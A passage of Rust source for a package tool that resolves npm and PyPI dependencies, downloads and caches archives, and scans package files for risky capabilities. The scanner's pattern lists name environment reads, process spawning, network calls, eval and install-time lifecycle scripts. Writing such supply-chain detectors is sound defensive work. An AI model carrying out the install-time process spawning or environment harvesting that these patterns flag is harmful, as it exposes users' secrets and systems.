    if value == "time.now" || value == "time" {
        return Ok(Capability::TimeNow);
    }
    if value == "random.bytes" || value == "random" {
        return Ok(Capability::RandomBytes);
    }

    let (kind, target) = value
        .split_once(':')
        .ok_or_else(|| OmcRegistryError::UnsupportedSpec(value.to_owned()))?;
    let target = target.to_owned();

    match kind {
        "env" | "env.read" | "env-read" => Ok(Capability::EnvRead(target)),
        "fs.read" | "fs-read" => Ok(Capability::FsRead(target)),
        "fs.write" | "fs-write" => Ok(Capability::FsWrite(target)),
        "http" | "network" => Ok(Capability::HttpHost(target)),
        "dns" => Ok(Capability::DnsHost(target)),
        "proc" | "proc.spawn" | "proc-spawn" => Ok(Capability::ProcSpawn(target)),
        _ => Err(OmcRegistryError::UnsupportedSpec(value.to_owned())),
    }
}

fn resolve_package(
    client: &Client,
    spec: &PackageSpec,
    options: &LinkOptions,
) -> Result<ResolvedPackage> {
    match spec.ecosystem {
        Ecosystem::Npm => resolve_npm(client, spec),
        Ecosystem::Pypi => resolve_pypi(client, spec, options),
    }
}

fn resolve_npm(client: &Client, spec: &PackageSpec) -> Result<ResolvedPackage> {
    let (registry_name, version_requirement) = npm_registry_name_and_requirement(spec)?;
    let install_name = spec.name.clone();
    let encoded = urlencoding::encode(&registry_name);
    let version = match version_requirement.as_deref() {
        Some(requirement) if is_exact_npm_version(requirement) => requirement.to_owned(),
        Some(requirement) => {
            let url = format!("https://registry.npmjs.org/{encoded}");
            let root = client
                .get(url)
                .send()?
                .error_for_status()?
                .json::<NpmRoot>()?;
            choose_npm_version(&registry_name, requirement, &root)?
        }
        None => {
            let url = format!("https://registry.npmjs.org/{encoded}");
            let root = client
                .get(url)
                .send()?
                .error_for_status()?
                .json::<NpmRoot>()?;
            root.dist_tags.latest
        }
    };
    let url = format!("https://registry.npmjs.org/{encoded}/{version}");
    let response = client.get(url).send()?;
    if response.status().as_u16() == 404 {
        return Err(OmcRegistryError::PackageNotFound(spec.requested()));
    }
    let version_doc = response.error_for_status()?.json::<NpmVersion>()?;
    let dependencies = npm_runtime_dependencies(&version_doc);
    let filename = version_doc
        .dist
        .tarball
        .rsplit('/')
        .next()
        .unwrap_or("package.tgz")
        .to_owned();

    Ok(ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: install_name,
        version: version_doc.version,
        source_url: version_doc.dist.tarball,
        filename,
        expected_sha256: None,
        npm_scripts: version_doc.scripts.unwrap_or_default(),
        dependencies,
    })
}

fn npm_registry_name_and_requirement(spec: &PackageSpec) -> Result<(String, Option<String>)> {
    let Some(requirement) = spec.version.as_deref() else {
        return Ok((spec.name.clone(), None));
    };
    let Some(alias) = requirement.strip_prefix("npm:") else {
        return Ok((spec.name.clone(), Some(requirement.to_owned())));
    };
    let alias_spec = parse_npm_spec(requirement, alias)?;
    Ok((alias_spec.name, alias_spec.version))
}

fn npm_runtime_dependencies(version_doc: &NpmVersion) -> Vec<PackageSpec> {
    let mut dependencies = BTreeMap::new();

    dependencies.extend(version_doc.dependencies.clone().unwrap_or_default());
    dependencies.extend(
        version_doc
            .optional_dependencies
            .clone()
            .unwrap_or_default(),
    );
    dependencies.extend(required_peer_dependencies(
        version_doc.peer_dependencies.clone().unwrap_or_default(),
        version_doc
            .peer_dependencies_meta
            .clone()
            .unwrap_or_default(),
    ));

    dependencies
        .into_iter()
        .map(|(name, requirement)| PackageSpec::new(Ecosystem::Npm, name, Some(requirement)))
        .collect()
}

fn resolve_pypi(
    client: &Client,
    spec: &PackageSpec,
    options: &LinkOptions,
) -> Result<ResolvedPackage> {
    let encoded = urlencoding::encode(&spec.name);
    let target_python = current_python_version();
    let constrained_requirement = constrained_pypi_requirement(spec, &options.constraints);
    let version = match constrained_requirement.as_deref() {
        Some(requirement) if is_exact_pypi_version(requirement) => requirement.to_owned(),
        Some(requirement) => {
            let url = format!("https://pypi.org/pypi/{encoded}/json");
            let root = client
                .get(url)
                .send()?
                .error_for_status()?
                .json::<PypiRoot>()?;
            choose_pypi_version(&spec.name, requirement, &root, target_python.as_deref())?
        }
        None => {
            let url = format!("https://pypi.org/pypi/{encoded}/json");
            let root = client
                .get(url)
                .send()?
                .error_for_status()?
                .json::<PypiRoot>()?;
            root.info.version
        }
    };
    let url = format!("https://pypi.org/pypi/{encoded}/{version}/json");
    let response = client.get(url).send()?;
    if response.status().as_u16() == 404 {
        return Err(OmcRegistryError::PackageNotFound(spec.requested()));
    }
    let doc = response.error_for_status()?.json::<PypiResponse>()?;
    let file = choose_pypi_file(&doc, target_python.as_deref())
        .ok_or_else(|| OmcRegistryError::MissingArtifact(spec.requested()))?;
    let source_url = file.url.clone();
    let filename = file.filename.clone();
    let expected_sha256 = file.digests.sha256.clone();
    let dependencies = doc
        .info
        .requires_dist
        .unwrap_or_default()
        .into_iter()
        .filter_map(|requirement| parse_pypi_requirement_with_extras(&requirement, &spec.extras))
        .collect::<Vec<_>>();

    Ok(ResolvedPackage {
        ecosystem: Ecosystem::Pypi,
        name: doc.info.name,
        version: doc.info.version,
        source_url,
        filename,
        expected_sha256: Some(expected_sha256),
        npm_scripts: BTreeMap::new(),
        dependencies,
    })
}

fn constrained_pypi_requirement(
    spec: &PackageSpec,
    constraints: &BTreeMap<String, String>,
) -> Option<String> {
    match (
        spec.version.as_deref(),
        constraints.get(&spec.constraint_key()),
    ) {
        (Some(requirement), Some(constraint)) if !requirement.trim().is_empty() => {
            Some(format!("{requirement},{constraint}"))
        }
        (Some(requirement), None) => Some(requirement.to_owned()),
        (_, Some(constraint)) => Some(constraint.clone()),
        (None, None) => None,
    }
}

fn choose_pypi_file<'a>(
    doc: &'a PypiResponse,
    target_python: Option<&str>,
) -> Option<&'a PypiFile> {
    doc.urls
        .iter()
        .filter(|file| pypi_file_python_compatible(file, target_python))
        .find(|file| file.packagetype == "bdist_wheel" && file.filename.contains("py3-none-any"))
        .or_else(|| {
            doc.urls
                .iter()
                .filter(|file| pypi_file_python_compatible(file, target_python))
                .find(|file| file.packagetype == "bdist_wheel")
        })
        .or_else(|| {
            doc.urls
                .iter()
                .filter(|file| pypi_file_python_compatible(file, target_python))
                .find(|file| file.packagetype == "sdist")
        })
        .or_else(|| {
            doc.urls
                .iter()
                .find(|file| pypi_file_python_compatible(file, target_python))
        })
}

fn choose_npm_version(name: &str, requirement: &str, root: &NpmRoot) -> Result<String> {
    if requirement == "latest" {
        return Ok(root.dist_tags.latest.clone());
    }

    root.versions
        .keys()
        .filter(|version| npm_version_satisfies(version, requirement))
        .max_by(|left, right| compare_npm_versions(left, right))
        .cloned()
        .ok_or_else(|| OmcRegistryError::UnsatisfiedRequirement {
            name: name.to_owned(),
            requirement: requirement.to_owned(),
        })
}

fn is_exact_npm_version(requirement: &str) -> bool {
    Version::parse(requirement).is_ok()
}

fn npm_version_satisfies(version: &str, requirement: &str) -> bool {
    let Ok(version) = Version::parse(version) else {
        return false;
    };
    let requirement = requirement.trim();

    if requirement.is_empty() || requirement == "*" || requirement == "latest" {
        return true;
    }
    if let Ok(exact) = Version::parse(requirement) {
        return version == exact;
    }
    if let Some(base) = requirement
        .strip_prefix('^')
        .and_then(parse_partial_npm_version)
    {
        let upper = if base.major > 0 {
            Version::new(base.major + 1, 0, 0)
        } else if base.minor > 0 {
            Version::new(0, base.minor + 1, 0)
        } else {
            Version::new(0, 0, base.patch + 1)
        };
        return version >= base && version < upper;
    }
    if let Some(base) = requirement
        .strip_prefix('~')
        .and_then(parse_partial_npm_version)
    {
        let upper = Version::new(base.major, base.minor + 1, 0);
        return version >= base && version < upper;
    }

    requirement
        .replace(',', " ")
        .split_whitespace()
        .all(|part| npm_comparator_satisfied(&version, part))
}

fn npm_comparator_satisfied(version: &Version, comparator: &str) -> bool {
    for op in [">=", "<=", ">", "<", "="] {
        if let Some(raw) = comparator.strip_prefix(op) {
            let Some(required) = parse_partial_npm_version(raw) else {
                return false;
            };
            return match op {
                ">=" => version >= &required,
                "<=" => version <= &required,
                ">" => version > &required,
                "<" => version < &required,
                "=" => version == &required,
                _ => false,
            };
        }
    }

    if comparator == "*" || comparator.eq_ignore_ascii_case("x") {
        true
    } else if comparator.ends_with(".x") || comparator.ends_with(".*") {
        let prefix = comparator.trim_end_matches('x').trim_end_matches('*');
        version.to_string().starts_with(prefix)
    } else {
        parse_partial_npm_version(comparator)
            .map(|required| version == &required)
            .unwrap_or(false)
    }
}

fn parse_partial_npm_version(raw: &str) -> Option<Version> {
    let mut parts = raw.trim().split('.');
    let major = parts.next()?.parse().ok()?;
    let minor = parts.next().and_then(|part| part.parse().ok()).unwrap_or(0);
    let patch = parts.next().and_then(|part| part.parse().ok()).unwrap_or(0);
    Some(Version::new(major, minor, patch))
}

fn compare_npm_versions(left: &str, right: &str) -> std::cmp::Ordering {
    match (Version::parse(left), Version::parse(right)) {
        (Ok(left), Ok(right)) => left.cmp(&right),
        _ => left.cmp(right),
    }
}

fn choose_pypi_version(
    name: &str,
    requirement: &str,
    root: &PypiRoot,
    target_python: Option<&str>,
) -> Result<String> {
    root.releases
        .iter()
        .filter(|(_, files)| {
            files
                .iter()
                .any(|file| pypi_file_python_compatible(file, target_python))
        })
        .map(|(version, _)| version)
        .filter(|version| pypi_version_satisfies(version, requirement))
        .max_by(|left, right| compare_pypi_versions(left, right))
        .cloned()
        .ok_or_else(|| OmcRegistryError::UnsatisfiedRequirement {
            name: name.to_owned(),
            requirement: requirement.to_owned(),
        })
}

fn is_exact_pypi_version(requirement: &str) -> bool {
    !requirement
        .chars()
        .any(|ch| matches!(ch, '<' | '>' | '=' | '!' | '~' | ',' | '*' | ' '))
}

fn pypi_version_satisfies(version: &str, requirement: &str) -> bool {
    let requirement = requirement.trim();
    if requirement.is_empty() || requirement == "*" {
        return true;
    }

    requirement
        .trim_matches(|ch| ch == '(' || ch == ')')
        .split(',')
        .map(str::trim)
        .filter(|part| !part.is_empty())
        .all(|part| pypi_comparator_satisfied(version, part))
}

fn pypi_file_python_compatible(file: &PypiFile, target_python: Option<&str>) -> bool {
    let Some(target_python) = target_python else {
        return true;
    };
    file.requires_python
        .as_deref()
        .map(|requirement| pypi_version_satisfies(target_python, requirement))
        .unwrap_or(true)
}

fn current_python_version() -> Option<String> {
    static CURRENT_PYTHON_VERSION: OnceLock<Option<String>> = OnceLock::new();
    CURRENT_PYTHON_VERSION
        .get_or_init(detect_python_version)
        .clone()
}

fn detect_python_version() -> Option<String> {
    let output = Command::new("python3")
        .arg("-c")
        .arg(
            "import sys; print(f'{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}')",
        )
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let version = String::from_utf8(output.stdout).ok()?.trim().to_owned();
    (!version.is_empty()).then_some(version)
}

fn pypi_comparator_satisfied(version: &str, comparator: &str) -> bool {
    for op in [">=", "<=", "==", "!=", "~=", ">", "<"] {
        if let Some(required) = comparator.strip_prefix(op) {
            let ordering = compare_pypi_versions(version, required.trim());
            return match op {
                ">=" => ordering.is_ge(),
                "<=" => ordering.is_le(),
                "==" => ordering.is_eq(),
                "!=" => !ordering.is_eq(),
                ">" => ordering.is_gt(),
                "<" => ordering.is_lt(),
                "~=" => ordering.is_ge(),
                _ => false,
            };
        }
    }

    compare_pypi_versions(version, comparator).is_eq()
}

fn compare_pypi_versions(left: &str, right: &str) -> std::cmp::Ordering {
    comparable_version(left).cmp(&comparable_version(right))
}

fn comparable_version(version: &str) -> Vec<u64> {
    version
        .split(|ch: char| !ch.is_ascii_digit())
        .filter(|part| !part.is_empty())
        .map(|part| part.parse().unwrap_or(0))
        .collect()
}

fn parse_pypi_requirement(requirement: &str) -> Option<PackageSpec> {
    parse_pypi_requirement_with_extras(requirement, &BTreeSet::new())
}

fn parse_pypi_requirement_with_extras(
    requirement: &str,
    active_extras: &BTreeSet<String>,
) -> Option<PackageSpec> {
    let mut parts = requirement.splitn(2, ';');
    let requirement = parts.next()?.trim();
    if let Some(marker) = parts.next() {
        if !pypi_marker_applies(marker, active_extras) {
            return None;
        }
    }

    if requirement.is_empty() {
        return None;
    }

    let name_end = requirement
        .char_indices()
        .find(|(_, ch)| !ch.is_ascii_alphanumeric() && !matches!(ch, '-' | '_' | '.' | '[' | ']'))
        .map(|(index, _)| index)
        .unwrap_or(requirement.len());
    let (name, extras) = parse_pypi_name_and_extras(requirement[..name_end].trim());
    if name.is_empty() {
        return None;
    }

    let version = requirement[name_end..]
        .trim()
        .trim_start_matches('(')
        .trim_end_matches(')')
        .replace(' ', "");

    Some(PackageSpec::with_extras(
        Ecosystem::Pypi,
        name,
        (!version.is_empty()).then_some(version),
        extras,
    ))
}

fn parse_pypi_name_and_extras(name: &str) -> (String, BTreeSet<String>) {
    let Some((base, extras)) = name.split_once('[') else {
        return (normalize_pypi_name(name), BTreeSet::new());
    };
    let extras = extras
        .trim_end_matches(']')
        .split(',')
        .map(|extra| extra.trim().replace('_', "-").to_ascii_lowercase())
        .filter(|extra| !extra.is_empty())
        .collect::<BTreeSet<_>>();
    (normalize_pypi_name(base), extras)
}

fn normalize_pypi_name(name: &str) -> String {
    name.replace('_', "-").to_ascii_lowercase()
}

fn parse_requirements_include(line: &str) -> Option<RequirementsInclude> {
    for (prefix, mode) in [
        ("--requirement=", RequirementsMode::Install),
        ("--constraint=", RequirementsMode::Constraint),
    ] {
        if let Some(rest) = line.strip_prefix(prefix) {
            let rest = rest.trim();
            if !rest.is_empty() {
                return Some(RequirementsInclude {
                    path: rest.to_owned(),
                    mode,
                });
            }
        }
    }

    for (prefix, mode) in [
        ("-r", RequirementsMode::Install),
        ("--requirement", RequirementsMode::Install),
        ("-c", RequirementsMode::Constraint),
        ("--constraint", RequirementsMode::Constraint),
    ] {
        if let Some(rest) = line.strip_prefix(prefix) {
            let rest = rest.trim_start();
            if rest.is_empty() {
                continue;
            }
            return Some(RequirementsInclude {
                path: rest.to_owned(),
                mode,
            });
        }
    }

    None
}

#[derive(Debug, Clone)]
struct PypiMarkerEnvironment {
    python_full_version: Option<String>,
    os_name: String,
    sys_platform: String,
    platform_system: String,
    platform_machine: String,
    implementation_name: String,
    platform_python_implementation: String,
    extra: String,
}

impl PypiMarkerEnvironment {
    fn current() -> Self {
        Self {
            python_full_version: current_python_version(),
            os_name: os_name().to_owned(),
            sys_platform: sys_platform().to_owned(),
            platform_system: platform_system().to_owned(),
            platform_machine: std::env::consts::ARCH.to_owned(),
            implementation_name: "cpython".to_owned(),
            platform_python_implementation: "CPython".to_owned(),
            extra: String::new(),
        }
    }

    fn value(&self, name: &str) -> Option<String> {
        match name {
            "python_version" => self.python_full_version.as_deref().map(python_major_minor),
            "python_full_version" => self.python_full_version.clone(),
            "os_name" => Some(self.os_name.clone()),
            "sys_platform" => Some(self.sys_platform.clone()),
            "platform_system" => Some(self.platform_system.clone()),
            "platform_machine" => Some(self.platform_machine.clone()),
            "implementation_name" => Some(self.implementation_name.clone()),
            "platform_python_implementation" => Some(self.platform_python_implementation.clone()),
            "extra" => Some(self.extra.clone()),
            _ => None,
        }
    }
}

fn pypi_marker_applies(marker: &str, active_extras: &BTreeSet<String>) -> bool {
    let mut env = PypiMarkerEnvironment::current();
    if active_extras.is_empty() {
        return evaluate_pypi_marker(marker.trim(), &env).unwrap_or(true);
    }

    active_extras.iter().any(|extra| {
        env.extra.clone_from(extra);
        evaluate_pypi_marker(marker.trim(), &env).unwrap_or(true)
    })
}

fn evaluate_pypi_marker(marker: &str, env: &PypiMarkerEnvironment) -> Option<bool> {
    let mut saw_unknown_true_path = false;

    for or_group in split_marker_keyword(marker, "or") {
        let mut group_unknown = false;
        let mut group_matches = true;

        for atom in split_marker_keyword(or_group, "and") {
            match evaluate_pypi_marker_atom(atom, env) {
                Some(true) => {}
                Some(false) => {
                    group_matches = false;
                    break;
                }
                None => group_unknown = true,
            }
        }

        if group_matches && !group_unknown {
            return Some(true);
        }
        if group_matches {
            saw_unknown_true_path = true;
        }
    }

    if saw_unknown_true_path {
        None
    } else {
        Some(false)
    }
}

fn evaluate_pypi_marker_atom(atom: &str, env: &PypiMarkerEnvironment) -> Option<bool> {
    let atom = atom
        .trim()
        .trim_start_matches('(')
        .trim_end_matches(')')
        .trim();

    let (left, op, right) = split_marker_comparison(atom)?;
    let left = marker_operand_value(left, env)?;
    let right = marker_operand_value(right, env)?;

    match op {
        "==" => Some(left == right),
        "!=" => Some(left != right),
        "in" => Some(right.contains(&left)),
        "not in" => Some(!right.contains(&left)),
        ">=" | "<=" | ">" | "<" => {
            if looks_like_version(&left) && looks_like_version(&right) {
                let ordering = compare_pypi_versions(&left, &right);
                Some(match op {
                    ">=" => ordering.is_ge(),
                    "<=" => ordering.is_le(),
                    ">" => ordering.is_gt(),
                    "<" => ordering.is_lt(),
                    _ => false,
                })
            } else {
                Some(match op {
                    ">=" => left >= right,
                    "<=" => left <= right,
                    ">" => left > right,
                    "<" => left < right,
                    _ => false,
                })
            }
        }
        _ => None,
    }
}

fn split_marker_comparison(atom: &str) -> Option<(&str, &'static str, &str)> {
    for (needle, op) in [
        (" not in ", "not in"),
        (" in ", "in"),
        ("==", "=="),
        ("!=", "!="),
        (">=", ">="),
        ("<=", "<="),
        (">", ">"),
        ("<", "<"),
    ] {
        if let Some(index) = find_outside_quotes(atom, needle) {
            let left = atom[..index].trim();
            let right = atom[index + needle.len()..].trim();
            if !left.is_empty() && !right.is_empty() {
                return Some((left, op, right));
            }
        }
    }

    None
}

fn marker_operand_value(value: &str, env: &PypiMarkerEnvironment) -> Option<String> {
    let value = value.trim();
    if let Some(quoted) = unquote_marker_value(value) {
        return Some(quoted);
    }
    env.value(value)
}

fn unquote_marker_value(value: &str) -> Option<String> {
    let bytes = value.as_bytes();
    if bytes.len() >= 2
        && ((bytes[0] == b'\'' && bytes[bytes.len() - 1] == b'\'')
            || (bytes[0] == b'"' && bytes[bytes.len() - 1] == b'"'))
    {
        Some(value[1..value.len() - 1].to_owned())
    } else {
        None
    }
}

fn split_marker_keyword<'a>(marker: &'a str, keyword: &str) -> Vec<&'a str> {
    let separator = format!(" {keyword} ");
    let mut parts = Vec::new();
    let mut start = 0;
    let mut quote = None;
    let mut index = 0;

    while index < marker.len() {
        let ch = marker[index..].chars().next().unwrap_or_default();
        let ch_len = ch.len_utf8();

        if matches!(ch, '\'' | '"') {
            if quote == Some(ch) {
                quote = None;
            } else if quote.is_none() {
                quote = Some(ch);
            }
        }

        if quote.is_none() && marker[index..].to_ascii_lowercase().starts_with(&separator) {
            parts.push(marker[start..index].trim());
            index += separator.len();
            start = index;
            continue;
        }

        index += ch_len;
    }

    parts.push(marker[start..].trim());
    parts
}

fn find_outside_quotes(haystack: &str, needle: &str) -> Option<usize> {
    let mut quote = None;
    let mut index = 0;

    while index < haystack.len() {
        let ch = haystack[index..].chars().next().unwrap_or_default();
        let ch_len = ch.len_utf8();

        if matches!(ch, '\'' | '"') {
            if quote == Some(ch) {
                quote = None;
            } else if quote.is_none() {
                quote = Some(ch);
            }
        }

        if quote.is_none() && haystack[index..].starts_with(needle) {
            return Some(index);
        }

        index += ch_len;
    }

    None
}

fn python_major_minor(version: &str) -> String {
    let mut parts = version.split('.');
    let major = parts.next().unwrap_or("0");
    let minor = parts.next().unwrap_or("0");
    format!("{major}.{minor}")
}

fn looks_like_version(value: &str) -> bool {
    value
        .chars()
        .next()
        .map(|ch| ch.is_ascii_digit())
        .unwrap_or(false)
}

fn os_name() -> &'static str {
    if cfg!(windows) {
        "nt"
    } else {
        "posix"
    }
}

fn sys_platform() -> &'static str {
    if cfg!(target_os = "macos") {
        "darwin"
    } else if cfg!(target_os = "windows") {
        "win32"
    } else if cfg!(target_os = "linux") {
        "linux"
    } else {
        std::env::consts::OS
    }
}

fn platform_system() -> &'static str {
    if cfg!(target_os = "macos") {
        "Darwin"
    } else if cfg!(target_os = "windows") {
        "Windows"
    } else if cfg!(target_os = "linux") {
        "Linux"
    } else {
        std::env::consts::OS
    }
}

fn download_artifact(client: &Client, package: &ResolvedPackage) -> Result<Vec<u8>> {
    Ok(client
        .get(&package.source_url)
        .send()?
        .error_for_status()?
        .bytes()?
        .to_vec())
}

fn cache_archive(
    project_dir: &Path,
    package: &ResolvedPackage,
    sha256: &str,
    bytes: &[u8],
) -> Result<PathBuf> {
    let cache_dir = project_dir
        .join(".omc")
        .join("cache")
        .join(package.ecosystem.to_string())
        .join(safe_name(&package.name))
        .join(&package.version);
    fs::create_dir_all(&cache_dir)?;

    let extension = archive_extension(&package.filename);
    let archive_path = cache_dir.join(format!("{sha256}.{extension}"));
    if !archive_path.exists() {
        fs::write(&archive_path, bytes)?;
    }
    Ok(archive_path)
}

fn write_artifact(
    project_dir: &Path,
    package: &ResolvedPackage,
    artifact: &OmcArtifact,
) -> Result<PathBuf> {
    let artifact_dir = project_dir
        .join(".omc")
        .join("artifacts")
        .join(package.ecosystem.to_string())
        .join(safe_name(&package.name))
        .join(&package.version);
    fs::create_dir_all(&artifact_dir)?;

    let artifact_path = artifact_dir.join("omc.json");
    fs::write(&artifact_path, serde_json::to_string_pretty(artifact)?)?;
    Ok(artifact_path)
}

#[derive(Debug, Clone)]
struct ArchiveProfile {
    files_scanned: usize,
    capabilities: Vec<CapabilityFinding>,
}

fn profile_archive(package: &ResolvedPackage, bytes: &[u8]) -> Result<ArchiveProfile> {
    let mut profiler = SourceProfiler::default();

    for (name, script) in &package.npm_scripts {
        if is_npm_lifecycle_script(name) {
            profiler.add(
                CapabilityKind::ProcSpawn,
                format!("npm-script:{name}"),
                "package.json",
                format!("lifecycle script `{name}` = `{script}`"),
            );
        }
    }

    if package.filename.ends_with(".tgz") || package.filename.ends_with(".tar.gz") {
        let decoder = GzDecoder::new(Cursor::new(bytes));
        let mut archive = Archive::new(decoder);
        for entry in archive.entries()? {
            let mut entry = entry?;
            if !entry.header().entry_type().is_file() || entry.size() > MAX_FILE_BYTES {
                continue;
            }
            let path = entry.path()?.to_string_lossy().into_owned();
            let mut content = String::new();
            entry.read_to_string(&mut content).ok();
            profiler.scan_file(&path, &content);
        }
    } else if package.filename.ends_with(".whl") || package.filename.ends_with(".zip") {
        let reader = Cursor::new(bytes);
        let mut archive = zip::ZipArchive::new(reader)?;
        for index in 0..archive.len() {
            let mut file = archive.by_index(index)?;
            if file.is_dir() || file.size() > MAX_FILE_BYTES {
                continue;
            }
            let path = file.name().to_owned();
            let mut content = String::new();
            file.read_to_string(&mut content).ok();
            profiler.scan_file(&path, &content);
        }
    } else {
        let content = String::from_utf8_lossy(bytes);
        profiler.scan_file(&package.filename, &content);
    }

    Ok(profiler.finish())
}

#[derive(Debug, Default)]
struct SourceProfiler {
    files_scanned: usize,
    findings: BTreeSet<CapabilityFinding>,
}

impl SourceProfiler {
    fn scan_file(&mut self, path: &str, content: &str) {
        if !is_source_like(path) || is_ignored_source_path(path) || content.is_empty() {
            return;
        }

        self.files_scanned += 1;
        let lower = content.to_ascii_lowercase();

        for pattern in ["process.env", "os.environ", "getenv("] {
            if lower.contains(pattern) {
                self.add(CapabilityKind::EnvRead, "*", path, pattern);
            }
        }

        for pattern in [
            "readfilesync",
            "readfile(",
            "createreadstream",
            "require(\"fs\")",
            "require('fs')",
            "open(",
        ] {
            if lower.contains(pattern) {
                self.add(CapabilityKind::FsRead, "*", path, pattern);
            }
        }

        for pattern in [
            "writefilesync",
            "writefile(",
            "createwritestream",
            ".write(",
        ] {
            if lower.contains(pattern) {
                self.add(CapabilityKind::FsWrite, "*", path, pattern);
            }
        }

        for pattern in [
            "fetch(",
            "require(\"http\")",
            "require('http')",
            "require(\"https\")",
            "require('https')",
            "axios",
            "requests.",
            "urllib.request",
            "httpx.",
            "socket.",
        ] {
            if lower.contains(pattern) {
                self.add(CapabilityKind::HttpRequest, "*", path, pattern);
            }
        }

        for pattern in [
            "child_process",
            "subprocess",
            "os.system",
            "popen(",
            "spawn(",
            "execfile(",
        ] {
            if lower.contains(pattern) {
                self.add(CapabilityKind::ProcSpawn, "*", path, pattern);
            }
        }

        for pattern in ["eval(", "new function", "exec("] {
            if lower.contains(pattern) {
                self.add(CapabilityKind::DynamicEval, "*", path, pattern);
            }
        }
    }

    fn add(
        &mut self,
        kind: CapabilityKind,
        target: impl Into<String>,
        source: impl Into<String>,
        evidence: impl Into<String>,
    ) {
        self.findings.insert(CapabilityFinding {
            kind,
            target: target.into(),
            source: source.into(),
            evidence: evidence.into(),
        });
    }

    fn finish(self) -> ArchiveProfile {
        ArchiveProfile {
            files_scanned: self.files_scanned,
            capabilities: self.findings.into_iter().collect(),
        }
    }
}

fn module_from_profile(package: &ResolvedPackage, capabilities: &[CapabilityFinding]) -> Module {
    let behavior = if capabilities.is_empty() {
        BehaviorType::Pure
    } else {
        BehaviorType::HostCapability
    };
    let mut code = Vec::new();
    for finding in capabilities {
        code.push(Op::Cap(cap_op_from_finding(finding)));
    }
    code.push(Op::Const(Value::Unit));
    code.push(Op::Return);

    Module {
        id: format!("{}:{}@{}", package.ecosystem, package.name, package.version),
        package: package.name.clone(),
        version: package.version.clone(),
        declared_behavior: behavior,
        functions: vec![Function::new(0, "package_init", 0, code)],
    }
}

fn cap_op_from_finding(finding: &CapabilityFinding) -> CapOp {
    match finding.kind {
        CapabilityKind::EnvRead => CapOp::EnvRead {
            name: finding.target.clone(),
        },
        CapabilityKind::FsRead => CapOp::FsRead {
            path: VirtualPath(finding.target.clone()),
        },
        CapabilityKind::FsWrite => CapOp::FsWrite {
            path: VirtualPath(finding.target.clone()),
            value_from_stack: false,
        },
        CapabilityKind::HttpRequest => CapOp::HttpRequest {
            request: HttpRequest {
                method: "POST".to_owned(),
                url: "omc://observed-network".to_owned(),
                host: finding.target.clone(),
                body_from_stack: false,
            },
        },
        CapabilityKind::ProcSpawn => CapOp::ProcSpawn {
            command: finding.target.clone(),
            args: Vec::new(),
        },
        CapabilityKind::DynamicEval => CapOp::DynamicEval {
            source_from_stack: false,
        },
    }
}

fn render_verify_finding(finding: VerifyFinding) -> String {
    format!(
        "{}[{}]: {}",
        finding.function, finding.instruction, finding.message
    )
}

fn is_npm_lifecycle_script(name: &str) -> bool {
    matches!(
        name,
        "preinstall"
            | "install"
            | "postinstall"
            | "prepare"
            | "prepublish"
            | "prepack"
            | "postpack"
    )
}

fn is_source_like(path: &str) -> bool {
    let path = path.to_ascii_lowercase();
    let file_name = Path::new(&path)
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or_default();

    if matches!(
        file_name,
        "package.json"
            | "package-lock.json"
            | "npm-shrinkwrap.json"
            | "setup.py"
            | "conftest.py"
            | "tox.ini"
            | "noxfile.py"
            | "pyproject.toml"
            | "setup.cfg"
    ) {
        return false;
    }

    matches!(
        Path::new(&path).extension().and_then(|ext| ext.to_str()),
        Some("js" | "mjs" | "cjs" | "ts" | "tsx" | "jsx" | "py" | "json" | "toml" | "cfg" | "ini")
    )
}

fn is_ignored_source_path(path: &str) -> bool {
    path.split('/').any(|component| {
        matches!(
            component.to_ascii_lowercase().as_str(),
            "test"
                | "tests"
                | "__tests__"
                | "docs"
                | "doc"
                | "examples"
                | "example"
                | "benchmark"
                | "benchmarks"
                | "perf"
                | "performance"
        )
    })
}

fn sha256_hex(bytes: &[u8]) -> String {
    let mut digest = Sha256::new();
    digest.update(bytes);
    hex::encode(digest.finalize())
}

fn archive_extension(filename: &str) -> &'static str {
    if filename.ends_with(".tar.gz") || filename.ends_with(".tgz") {
        "tgz"
    } else if filename.ends_with(".whl") {
        "whl"
    } else if filename.ends_with(".zip") {
        "zip"
    } else {
        "archive"
    }
}

fn safe_name(name: &str) -> String {
    name.replace('/', "__")
}

fn relative_path(base: &Path, path: &Path) -> String {
    path.strip_prefix(base)
        .unwrap_or(path)
        .to_string_lossy()
        .replace('\\', "/")
}

#[derive(Debug, Deserialize)]
struct ProjectPackageJson {
    #[serde(default)]
    dependencies: BTreeMap<String, String>,
    #[serde(default, rename = "devDependencies")]
    dev_dependencies: BTreeMap<String, String>,
    #[serde(default, rename = "optionalDependencies")]
    optional_dependencies: BTreeMap<String, String>,
    #[serde(default, rename = "peerDependencies")]
    peer_dependencies: BTreeMap<String, String>,
    #[serde(default, rename = "peerDependenciesMeta")]
    peer_dependencies_meta: BTreeMap<String, NpmPeerDependencyMeta>,
}

#[derive(Debug, Deserialize)]
struct NpmInstalledPackageJson {
    name: Option<String>,
    bin: Option<NpmBinField>,
}

#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum NpmBinField {
    String(String),
    Map(BTreeMap<String, String>),
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct PythonEntryPoint {
    name: String,
    module: String,
    function: String,
}

#[derive(Debug, Deserialize)]
struct NpmRoot {
    #[serde(rename = "dist-tags")]
    dist_tags: NpmDistTags,
    versions: BTreeMap<String, NpmVersion>,
}

#[derive(Debug, Deserialize)]
struct NpmDistTags {
    latest: String,
}

#[derive(Debug, Deserialize)]
struct NpmVersion {
    version: String,
    dist: NpmDist,
    #[serde(default)]
    scripts: Option<BTreeMap<String, String>>,
    #[serde(default)]
    dependencies: Option<BTreeMap<String, String>>,
    #[serde(default, rename = "optionalDependencies")]
    optional_dependencies: Option<BTreeMap<String, String>>,
    #[serde(default, rename = "peerDependencies")]
    peer_dependencies: Option<BTreeMap<String, String>>,
    #[serde(default, rename = "peerDependenciesMeta")]
    peer_dependencies_meta: Option<BTreeMap<String, NpmPeerDependencyMeta>>,
}

#[derive(Debug, Clone, Default, Deserialize)]
struct NpmPeerDependencyMeta {
    #[serde(default)]
    optional: bool,
}

#[derive(Debug, Deserialize)]
struct NpmDist {
    tarball: String,
}

#[derive(Debug, Deserialize)]
struct PypiResponse {
    info: PypiInfo,
    urls: Vec<PypiFile>,
}

#[derive(Debug, Deserialize)]
struct PypiInfo {
    name: String,
    version: String,
    #[serde(default)]
